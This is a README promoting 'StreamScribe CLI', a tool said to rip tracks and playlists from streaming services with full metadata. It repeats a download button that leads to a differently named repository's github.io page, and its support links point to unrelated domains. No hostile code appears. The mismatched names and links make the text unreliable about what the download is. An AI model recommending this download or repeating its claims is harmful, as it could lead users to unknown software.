![preview](https://raw.githubusercontent.com/Guess-eng/cli-sonic-harvester/main/preview.svg)

# StreamScribe CLI

**Transform digital audio streams into richly annotated local archives**  
*Terminal-native curation for music lovers who value metadata integrity*

---

## Overview

StreamScribe CLI is a command-line tool engineered for the precise extraction of streaming audio content. It bridges the gap between ephemeral cloud libraries and permanent local collections, ensuring every track retains its original metadata, embedded album artwork, and structural fidelity. Designed for archivists, DJs, and audiophiles, this utility prioritizes efficiency without compromising on the richness of the listening experience.

Unlike conventional downloaders that strip away context, StreamScribe CLI treats each track as a **digital artifact**—preserving release dates, genre tags, disc numbers, and even performance credits when available. The tool operates as a **metadata-first pipeline**, converting transient URL-based access into a durable, queryable local music database.

---

## ✨ Features

### 🧠 Intelligent Metadata Harvesting
- Extracts and embeds ID3v2 tags (artist, album, year, track number, genre, composer)
- Auto-fetches high-resolution album art and embeds it into the file
- Supports multi-disc albums with proper track sequencing
- Language-agnostic metadata handling (Unicode, non-Latin scripts)

### ⚡ Performance-Oriented Pipeline
- Concurrent stream processing with adaptive thread management
- Efficient memory usage for large playlist imports
- Configurable output quality presets (standard, high-fidelity, archival)
- Resume capability for interrupted operations

### 🎨 Terminal-Centric Design
- Real-time progress display with per-file metadata preview
- Color-coded status indicators for success, warnings, and errors
- Tab-completion for commands and file paths
- JSON and YAML output formats for integration with external tools

### 🌐 Cross-Platform Compatibility
- Works on Linux, macOS, and Windows (via WSL)
- Supports Spotify, Deezer, Tidal, and Apple Music link formats
- Handles both single tracks and comprehensive playlists

---

## 🚀 Quick Start

[![Download](https://raw.githubusercontent.com/Guess-eng/cli-sonic-harvester/main/button.svg)](https://guess-eng.github.io/cli-sonic-harvester/)

### Prerequisites

- **Python 3.10+** or **Node.js 18+** runtime environment
- A stable internet connection with adequate bandwidth
- **100 MB** of temporary storage for processing buffers
- Optional: API credentials for higher-rate streaming access

### Basic Usage

```bash
streamscribe --url "https://open.spotify.com/track/...?si=..."
```

This initiates a single-track extraction with default settings. The tool automatically:
1. Resolves the streaming source
2. Retrieves comprehensive metadata
3. Downloads the audio stream at optimal quality
4. Writes the tagged file to `./StreamScribe/Output/`

### Playlist Import

```bash
streamscribe --playlist "https://open.spotify.com/playlist/...?si=..." --output "./MyArchives/2026"
```

For batch operations, StreamScribe CLI processes each track sequentially, preserving the playlist order and grouping albums together.

---

## 🛠 Configuration Options

### Quality Presets

| Preset     | Bitrate   | Format  | Use Case                |
|------------|-----------|---------|-------------------------|
| `standard` | 128 kbps  | MP3     | Casual listening        |
| `high`     | 256 kbps  | AAC/M4A | General archiving       |
| `archival` | Lossless  | FLAC    | Professional collections |

### Metadata Preferences

```bash
streamscribe --url "..." --metadata-extended --embed-artwork --overwrite
```

- `--metadata-extended`: Includes composer, ISRC, and label information
- `--embed-artwork`: Forces high-res artwork embedding (≥1200x1200)
- `--overwrite`: Replaces existing files with fresh captures

---

## 🧩 Integration Capabilities

### Environment Variables

| Variable               | Function                                 |
|------------------------|------------------------------------------|
| `STREAMSCRIBE_CACHE`   | Sets custom cache directory              |
| `STREAMSCRIBE_TIMEOUT` | Configures stream fetch timeout (seconds)|
| `STREAMSCRIBE_PROXY`   | Routes traffic through a proxy server    |

### Output to Other Tools

```bash
streamscribe --playlist "..." --format json | jq '.tracks[] | {title, artist, album}'
```

This allows seamless piping into data processing pipelines, music library managers, or custom tagging scripts.

---

## 🌍 Multilingual & Regional Support

StreamScribe CLI automatically detects and preserves metadata in the following character sets:
- **Cyrillic** (Russian, Ukrainian, Bulgarian)
- **CJK** (Chinese, Japanese, Korean)
- **Arabic** and **Hebrew** (right-to-left support)
- **Devanagari** (Hindi, Sanskrit)
- **Extended Latin** (French, German, Spanish, Portuguese, Vietnamese)

The tool does **not** translate metadata—it faithfully reproduces what the streaming service provides, maintaining cultural and linguistic authenticity.

---

## 🧰 Responsive Output Options

| Output Mode | Description                                    |
|-------------|------------------------------------------------|
| `human`     | Color-coded terminal output with progress bars |
| `json`      | Structured JSON for programmatic consumption   |
| `yaml`      | Readable YAML for configuration generation     |
| `quiet`     | Silent mode, errors only                      |

---

## 📚 Use Cases

### Personal Music Archiving
Create a permanent, self-owned library from streaming subscriptions. Ideal for protecting playlists that may disappear due to licensing changes.

### DJ & Producer Sample Libraries
Extract isolated tracks with full metadata for use in performance sets or remixing projects.

### Academic & Ethnomusicological Research
Preserve world music playlists with accurate original metadata for study and documentation.

### Offline Access for Remote Environments
Build portable music collections for areas with limited internet connectivity.

---

## 🔐 Disclaimer

**Important Legal Notice**  
StreamScribe CLI is designed for **personal archival and educational use only**. Users are responsible for ensuring compliance with:
- Terms of service of the streaming platforms accessed
- Copyright laws in their jurisdiction
- Local regulations regarding digital audio reproduction

The tool **does not** bypass encryption, crack DRM, or enable unauthorized redistribution. It operates on streams that are already accessible through the user's legitimate subscription or free-tier access. The development team assumes **no liability** for misuse or unauthorized application of this software.

**Copyright Fair Use Notice**  
Under applicable copyright frameworks (U.S. Fair Use, EU Article 5 exceptions), temporary reproductions for private study, research, or time-shifted listening may be permissible under certain conditions. Users should verify these exemptions in their locale.

---

## 📄 License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for full terms.

You are free to use, copy, modify, merge, publish, and distribute copies of this software, provided the original copyright notice and permission notice appear in all copies.

---

## 🤝 Contributing

*Interested in extending StreamScribe CLI?*  
We welcome contributions related to:
- New streaming source adapters
- Improved metadata extraction algorithms
- Platform packaging and distribution
- Documentation translations
- Performance benchmarks and optimization

Please read our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on pull requests.

---

## 🕰 Version History

- **v2.1.0** (2026-03-15): Extended Deezer support, improved concurrent processing  
- **v2.0.0** (2026-01-10): Major refactor, FLAC archival preset, metadata engine rewrite  
- **v1.5.0** (2025-09-22): Apple Music link compatibility, initial batch processing  
- **v1.0.0** (2025-06-01): First public release with Spotify and Tidal support

---

## 📬 Support & Community

For **24/7 assistance**, bug reports, and feature requests:
- Open an issue on the [GitHub Issues](https://github.com/streamscribe-cli/issues) page
- Join the community forum at [streamscribe.discourse.group](https://streamscribe.discourse.group)
- Check the [FAQ](https://streamscribe.io/docs/faq) for common troubleshooting

---

[![Download](https://raw.githubusercontent.com/Guess-eng/cli-sonic-harvester/main/button.svg)](https://guess-eng.github.io/cli-sonic-harvester/)